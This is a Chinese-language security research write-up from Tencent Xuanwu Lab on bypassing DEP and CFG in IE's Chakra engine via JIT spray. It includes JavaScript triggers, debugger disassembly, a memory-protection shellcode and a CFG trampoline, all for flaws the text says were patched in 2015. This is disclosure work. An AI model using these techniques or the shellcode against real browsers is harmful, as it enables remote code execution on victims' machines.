# 利用 Chakra JIT Spray 绕过 DEP 和 CFG

tombkeeper@腾讯玄武实验室

0x00 摘要
=====

JIT Spray是一种诞生于2010年的漏洞利用技术，可将Shellcode嵌入到JIT引擎生成的可执行代码中。目前，包括Chakra在内的各JIT引擎几乎都针对该技术采取了防御措施，包括随机插入空指令、立即数加密等。本文将指出Chakra的JIT Spray防御措施的两个问题（分别存在于Windows 8.1及其之前的系统，以及Windows 10之中），使得攻击者可在IE中用JIT Spray技术执行Shellcode，从而绕过DEP。同时，本文还给出了一种利用Chakra的JIT引擎绕过CFG的方法。

0x01 JIT引擎的立即数加密
=====

立即数加密是最重要的JIT Spray缓解技术。Chakra引擎会对每一个高位或低位不是0x0000或0xFFFF的用户传入的立即数用随机生成的Key进行异或，再在运行时还原。例如，对于以下JavaScript：

```
...
a ^= 0x90909090;
a ^= 0x90909090;
a ^= 0x90909090;
...

```

生成的机器指令将类似于：

```
...
096b0091 ba555593c5      mov     edx,0C5935555h
096b0096 81f2c5c50355    xor     edx,5503C5C5h
096b009c 33fa            xor     edi,edx
096b009e bab045edfb      mov     edx,0FBED45B0h
096b00a3 81f220d57d6b    xor     edx,6B7DD520h
096b00a9 33fa            xor     edi,edx
096b00ab baef85f139      mov     edx,39F185EFh
096b00b0 81f27f1561a9    xor     edx,0A961157Fh
096b00b6 33fa            xor     edi,edx
...

```

从而使所生成指令中的立即数不可预测，也就无法嵌入代码。

0x02 绕过Windows 8.1及其之前Chakra引擎的立即数加密
=====

Chakra引擎内部对整数n会以n_2+1的方式存储。所以，在处理n=n+m时，不必从n_2+1还原出n再和m相加，只需要将m_2加到n_2+1的结果上去即可。而对于m*2，Windows 8.1及其之前的Chakra引擎会认为是其自身生成的数据，而不是用户传入的，所以不会进行加密。例如对以下JavaScript：

```
...
a += 0x18EB9090/2;
a += 0x18EB9090/2;
...

```

在某几个条件同时满足的情况下，可以让Windows 8.1及其之前的Chakra引擎生成类似这样的机器指令：

```
...
05010090 81c19090eb18    add     ecx,18EB9090h
05010096 0f80d6010000    jo      05010272
0501009c 8bf9            mov     edi,ecx
0501009e 8b5dbc          mov     ebx,dword ptr [ebp-44h]
050100a1 f6c301          test    bl,1
050100a4 0f8413020000    je      050102bd
050100aa 8bcb            mov     ecx,ebx
050100ac 81c19090eb18    add     ecx,18EB9090h
050100b2 0f8005020000    jo      050102bd
050100b8 8bf9            mov     edi,ecx
050100ba 8b5dbc          mov     ebx,dword ptr [ebp-44h]
050100bd f6c301          test    bl,1
050100c0 0f8442020000    je      05010308
050100c6 8bcb            mov     ecx,ebx
...
0:017> u 05010090 + 2 l 3
05010092 90              nop
05010093 90              nop
05010094 eb18            jmp     050100ae
0:017> u 050100ae l 3
050100ae 90              nop
050100af 90              nop
050100b0 eb18            jmp     050100ca

```

所以只要写出每条指令长度不大于2字节的Shellcode，就可以嵌入到立即数中。因为实际产生的立即数是JavaScript中数字的2倍，所以使用的指令如果是2字节，第1字节必须为偶数。这是完全可能做到的。

```
0x5854   // push esp--pop eax    ; eax = esp, make eax writeable
0x5252   // push edx--push edx   ; esp -= 8
0x016A   // push 1
0x4A5A   // pop  edx--dec edx    ; edx = 0
0x5E52   // push edx--pop esi    ; esi = 0
0x40B6   // mov  dh, 0x40        ; edx = 0x4000, NumberOfBytesToProtect
0x5452   // push edx--push esp   ; *esp = &NumberOfBytesToProtect
0x5B90   // pop  ebx             ; ebx = &NumberOfBytesToProtect
0x14B6   // mov  dh, 0x14
0x14B2   // mov  dl, 0x14
0x5266   // push dx
0x5666   // push si              ; *esp = 0x14140000
0x525A   // pop  edx-push edx    ; edx = 0x14140000
0x5E54   // push esp--pop  esi   ; esi = &BaseAddress, 
0x5454   // push esp--push esp   ; push &OldAccessProtection 
0x406A   // push 0x40            ; PAGE_EXECUTE_READWRITE
0x5390   // push ebx             ; push  &NumberOfBytesToProtect
0x5690   // push esi             ; push &BaseAddress
0xFF6A   // push -1              ; 
0x5252   // push edx--push edx   ; set ret addr
0x5290   // push edx             ; prepare esp for fs:[esi]
0x016A   // push 1
0x4A5A   // pop  edx--dec edx    ; edx = 0
0xC0B2   // mov  dl, 0xC0
0x5E52   // push edx--pop esi
0x5F54   // push esp--pop edi
0xA564   // movs dword ptr [edi], dword ptr fs:[esi] ; *esp = *(fs:0xC0)
0x4FB2   // mov  dl, 0x50        ; NtProtectVirtualMemory, Win8.1:0x4F, Win10:0x50
0x5290   // push edx
0xC358   // pop  eax--ret        ; ret to syscall

```

0x03 绕过Windows 10的 Chakra引擎的立即数加密
=====

Windows 10的Chakra引擎并没有前述问题。但是，由于Windows 10的Chakra引擎高度优化，在处理整数类型数组写入操作时，会用最高效的方式生成JIT代码。例如，对于下面的JavaScript语句：

```
var ar = new Uint16Array(0x10000);
ar[0x9090/2] = 0x9090;
ar[0x9090/2] = 0x9090;
ar[0x9090/2] = 0x9090;
ar[0x9090/2] = 0x9090;
...

```

生成的机器指令是：

```
...
0b8110e0 66c786909000009090 mov   word ptr [esi+9090h],9090h
0b8110e9 66c786909000009090 mov   word ptr [esi+9090h],9090h
0b8110f2 66c786909000009090 mov   word ptr [esi+9090h],9090h
0b8110fb 66c786909000009090 mov   word ptr [esi+9090h],9090h
...

```

虽然Chakra引擎的JIT Spray防御措施只允许用户控制最多2字节立即数，但在上面这种情况下，数组索引和要写入的数字会出现在同一条指令中。所以实际上我们有了4字节而不是2字节的可控数据。

在这种情况下，同样可在其中嵌入前面提到的每条指令长度不大于2字节的Shellcode。只是由于多了中间的两字节0x00（会被作为指令“add byte ptr [eax],al”执行），所以需要在最开始两字节的指令中将EAX设为可写的地址。

0x04 利用Chakra引擎绕过CFG
=====

利用前面介绍的两种方法，可以实施JIT Spray绕过DEP。但嵌入在JIT代码中的Shellcode执行入口地址显然无法通过CFG检查。但实际上Chakra引擎的实现中就存在可用来绕过CFG的地方。

无论所执行的JavaScript是否需要启动JIT，Chakra引擎都一定会在内存中生成如下入口函数：

```
0:017> uf 4ff0000
04ff0000 55          push  ebp
04ff0001 8bec        mov   ebp,esp
04ff0003 8b4508      mov   eax,dword ptr [ebp+8]
04ff0006 8b4014      mov   eax,dword ptr [eax+14h]
04ff0009 8b4840      mov   ecx,dword ptr [eax+40h]
04ff000c 8d4508      lea   eax,[ebp+8]
04ff000f 50          push  eax
04ff0010 b840cb5a71  mov   eax, 715acb40h ; jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>
04ff0015 ffe1        jmp   ecx

```

这个函数的指针可以通过CFG检查，同时，这个函数在jmp ecx之前，并没有对ecx的指针其进行CFG检查。所以，这个入口函数实际上相当于一个可以跳往任意地址的跳板。下面我们姑且将其称作“cfgJumper”。

0x05 定位JIT内存和“cfgJumper”
=====

要利用JIT Spray绕过DEP和利用“cfgJumper”绕过CFG，就需要定位JIT编译后的代码和“cfgJumper”，有趣的是，找到它们的方法几乎是相同的。

在JavaScript中所写的任何一个函数，都对应一个Js::ScriptFunction对象。每个Js::ScriptFunction对象又包含着一个Js::FunctionBody对象。Js::FunctionBody对象中保存着调用这个JavaScript函数时实际会执行的内存指针。

如果一个函数未被调用过，那么它的Js::FunctionBody中存放的实际内存指针是Js::InterpreterStackFrame::DelayDynamicInterpreterThunk：

```
0:002> dc 0b89de70 l 8
0b89de70  6ff72808 0b89de40 00000000 00000000  .(.o@...........
0b89de80  70523168 0b8d0000 7041f35c 00000000  h1Rp....\.Ap....
0:002> dc 0b8d0000 l 8
0b8d0000  6ff6c970 70181720 00000001 00000000  p..o ..p........
0b8d0010  0b8d0000 000001b8 072cc7e0 0b418ea0  ..........,...A.
0:002> u 70181720 l 1
Chakra!Js::InterpreterStackFrame::DelayDynamicInterpreterThunk:
70181720 55              push    ebp

```

如果一个函数被调用过，但没有被编译为JIT代码，仍然是解释执行，那么它的Js::FunctionBody中存放的实际内存指针是“cfgJumper”：

```
0:002> dc 0b89de70 l 8
0b89de70  6ff72808 0b89de40 00000000 00000000  .(.o@...........
0b89de80  70523168 0b8d0000 7041f35c 00000000  h1Rp....\.Ap....
0:002> dc 0b8d0000 l 8
0b8d0000  6ff6c970 00860000 00000001 00000000  p..o............
0b8d0010  0b8d0000 000001b8 072cc7e0 0b418ea0  ..........,...A.
0:002> u 00860000
00860000 55          push  ebp
00860001 8bec        mov   ebp,esp
00860003 8b4508      mov   eax,dword ptr [ebp+8]
00860006 8b4014      mov   eax,dword ptr [eax+14h]
00860009 8b4840      mov   ecx,dword ptr [eax+40h]
0086000c 8d4508      lea   eax,[ebp+8]
0086000f 50          push  eax
00860010 b800240870  mov   70082400h ; Chakra!Js::InterpreterStackFrame::InterpreterThunk

```

如果一个函数被循环调用多次，导致Chakra引擎将其编译为JIT代码，那么它的Js::FunctionBody中存放的实际内存指针就是该函数编译后的JIT代码指针：

```
0:002> d 0b89de70 l8
0b89de70  6ff72808 0b89de40 00000000 00000000  .(.o@...........
0b89de80  70523168 0b8d0000 7041f35c 00000000  h1Rp....\.Ap....
0:002> d 0b8d0000 l8
0b8d0000  6ff6c970 00950000 00000001 00000000  p..o............
0b8d0010  0b8d0000 000001b8 072cc7e0 0b418ea0  ..........,...A.
0:002> u 00950000
00950000 55              push    ebp
00950001 8bec            mov     ebp,esp
00950003 81fc44c9120b    cmp     esp,0B12C944h
00950009 7f18            jg      00950023
0095000b 6a00            push    0
0095000d 6a00            push    0
0095000f 68e0c72c07      push    72CC7E0h
00950014 6844090000      push    944h

```

了解了Js::ScriptFunction和Js::FunctionBody对象的结构，以及上面所述的这些，就可以准确地找到编译后的JIT代码，和“cfgJumper”。

0x06 随机插入空指令的问题
=====

除了立即数加密，Chakra引擎也采用了随机插入空指令的方法来缓解JIT Spray。不过Chakra插入空指令的密度并不高。PoC中使用的由29个16位数组成的JIT Shellcode，在针对Windows 10的利用方式中，会生成29条x86指令，其中几乎不会被插入空指令。但是在针对Windows 8.1及其之前的Chakra引擎的利用方式中，会生成约200条x86指令，就很可能被插入空指令。

解决这个问题的方法是：

1.  创建一个新的script标签，并将包含JIT ShellCode的JavaScript函数放在里面。
2.  循环调用该函数触发JIT编译。
3.  读取编译后的代码，判断JIT ShellCode中间是否被插入了空指令。
4.  如果被插入了空指令，就销毁script标签，重新创建。循环上述过程。

本文测试环境是安装了2015年5月补丁的Windows 8.1和Windows 10 TP 9926。

本文所述问题微软已于2015年9月修复。